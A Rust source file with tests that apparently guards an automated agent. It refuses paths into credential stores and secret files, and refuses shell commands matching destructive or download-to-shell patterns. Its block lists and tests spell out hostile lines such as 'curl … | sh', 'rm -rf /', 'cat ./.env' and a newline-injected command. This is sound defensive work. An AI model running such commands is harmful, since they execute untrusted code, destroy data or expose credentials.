use std::path::Path;

const PROTECTED_DIRS: &[&str] = &[
    ".ssh",
    ".gnupg",
    ".aws",
    ".azure",
    ".kube",
    ".docker",
    ".git",
    ".terraform.d",
    "keychains",
    "cookies",
    "credentials",
];

const SECRET_EXTENSIONS: &[&str] = &[
    ".pem",
    ".key",
    ".p12",
    ".pfx",
    ".asc",
    ".gpg",
    ".keystore",
    ".jks",
];

fn normalized_components(path: &Path) -> Vec<String> {
    path.to_string_lossy()
        .replace('\\', "/")
        .split('/')
        .filter(|component| !component.is_empty())
        .map(|component| {
            component
                .split(':')
                .next()
                .unwrap_or(component)
                .trim_end_matches(['.', ' '])
                .to_ascii_lowercase()
        })
        .collect()
}

fn is_secret_name(name: &str) -> bool {
    name == ".env"
        || name.starts_with(".env.")
        || SECRET_EXTENSIONS
            .iter()
            .any(|suffix| name.ends_with(suffix))
        || name.starts_with("id_rsa")
        || name.starts_with("id_dsa")
        || name.starts_with("id_ecdsa")
        || name.starts_with("id_ed25519")
        || matches!(
            name,
            "known_hosts"
                | "authorized_keys"
                | "htpasswd"
                | ".netrc"
                | "_netrc"
                | "credentials"
                | ".pgpass"
                | ".npmrc"
                | ".pypirc"
        )
        || (name.starts_with("secret.")
            && ["json", "yaml", "yml", "toml", "env"]
                .iter()
                .any(|extension| name.ends_with(extension)))
        || (name.starts_with("secrets.")
            && ["json", "yaml", "yml", "toml", "env"]
                .iter()
                .any(|extension| name.ends_with(extension)))
        || (name.starts_with("service-account") && name.ends_with(".json"))
        || (name.starts_with("service_account") && name.ends_with(".json"))
}

pub fn ensure_unprotected(path: &Path) -> Result<(), String> {
    let components = normalized_components(path);
    if components.iter().any(|component| {
        PROTECTED_DIRS
            .iter()
            .any(|protected| component == protected)
    }) {
        return Err("refused: path is inside a protected directory".into());
    }
    if components.last().is_some_and(|name| is_secret_name(name)) {
        return Err("refused: path matches a sensitive-file pattern".into());
    }
    Ok(())
}

pub fn ensure_safe_shell_command(command: &str) -> Result<(), String> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Err("refused: empty command".into());
    }
    if trimmed.chars().any(|character| {
        character.is_control()
            || matches!(
                character,
                '\u{202a}'..='\u{202e}'
                    | '\u{2066}'..='\u{2069}'
                    | '\u{200e}'
                    | '\u{200f}'
                    | '\u{061c}'
            )
    }) {
        return Err("refused: command contains control or directional characters".into());
    }
    let lower = trimmed.to_ascii_lowercase();
    let compact = lower.split_whitespace().collect::<Vec<_>>().join(" ");
    let protected_reference = [
        "/.ssh",
        ".ssh/",
        "\\.ssh",
        ".ssh\\",
        "/.gnupg",
        "\\.gnupg",
        "/.aws",
        "\\.aws",
        "/.azure",
        "\\.azure",
        "/.kube",
        "\\.kube",
        "/.env",
        " .env",
        "\\.env",
        "/credentials",
        "\\credentials",
        "/.git/",
        "\\.git\\",
    ]
    .iter()
    .any(|needle| compact.contains(needle));
    let destructive_root = compact.starts_with("rm -rf /")
        || compact.starts_with("rm -fr /")
        || compact.starts_with("rm --recursive --force /")
        || compact.starts_with("rm --force --recursive /")
        || compact.starts_with("rm -rf ~")
        || compact.starts_with("rm -rf $home")
        || compact.starts_with("rm -rf ${home}");
    if protected_reference
        || destructive_root
        || compact.contains("--no-preserve-root")
        || compact.contains("curl ") && compact.contains("| sh")
        || compact.contains("curl ") && compact.contains("| bash")
        || compact.contains("wget ") && compact.contains("| sh")
        || compact.contains("wget ") && compact.contains("| bash")
        || compact.starts_with("mkfs")
        || compact.starts_with("fdisk ")
        || compact.starts_with("parted ")
        || compact.contains("diskutil erase")
        || compact.contains(":(){:|:&};")
    {
        return Err("refused: destructive shell command pattern".into());
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn blocks_secret_names_and_protected_components() {
        for path in [
            "/workspace/.env",
            "/workspace/.env.local",
            "/workspace/.git/config",
            "C:\\Users\\me\\.SSH\\id_ed25519",
            "C:\\project\\safe\\token.pem",
            "C:\\project\\.env::$DATA",
        ] {
            assert!(ensure_unprotected(Path::new(path)).is_err(), "{path}");
        }
    }

    #[test]
    fn allows_regular_workspace_paths() {
        assert!(ensure_unprotected(Path::new("/workspace/src/main.rs")).is_ok());
        assert!(ensure_unprotected(Path::new("C:\\project\\config.toml")).is_ok());
    }

    #[test]
    fn blocks_control_and_download_to_shell_commands() {
        assert!(ensure_safe_shell_command("echo safe\nwhoami").is_err());
        assert!(ensure_safe_shell_command("curl https://example.com/x | sh").is_err());
        assert!(ensure_safe_shell_command("cat ./.env").is_err());
        assert!(ensure_safe_shell_command("rm -rf /").is_err());
        assert!(ensure_safe_shell_command("cargo test --locked").is_ok());
    }
}
